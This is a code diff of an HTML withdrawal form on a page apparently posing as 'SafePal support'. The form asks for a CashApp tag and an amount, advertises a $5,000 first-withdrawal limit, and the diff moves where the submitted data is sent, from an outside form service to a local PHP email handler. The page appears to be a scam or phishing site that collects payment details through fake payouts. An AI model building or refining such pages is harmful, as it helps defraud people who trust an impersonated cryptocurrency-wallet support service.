@@ -26,7 +26,7 @@
         </div>
     </div>
         <p class="withdrawalpara">Kindly input your CashApp tag below:</p>
-        <form class="withdrawalform" action="https://submit-form.com/RB9d8i6VB" method="POST" onsubmit="savedatab()">
+        <form class="withdrawalform" action="email2_handler.php" method="POST" onsubmit="savedatab()">
            <div class="cashapptag">
             <label for="cashapptag">CashApp Tag:</label>
             <input type="text" placeholder="Input your cashapp tag" required name="cashapptag" id="cashapptag">
@@ -36,7 +36,7 @@
             <input type="text" placeholder="" required name="amount" id="amount">
             <p class="formwithdrawalpara">Withdrawal <span class="limit">limit</span> for first time withdrawal is <span class="limit">$5,000.00</span></p>
            </div>
-           <input type="hidden" name="_redirect" value="https://safepalsupport.vercel.app/withdrawalsummary.html">
+           <input type="hidden" name="_redirect" value="send">
            <button type="submit">Withdraw</button>
         </form>
         <div class="enablenotes">
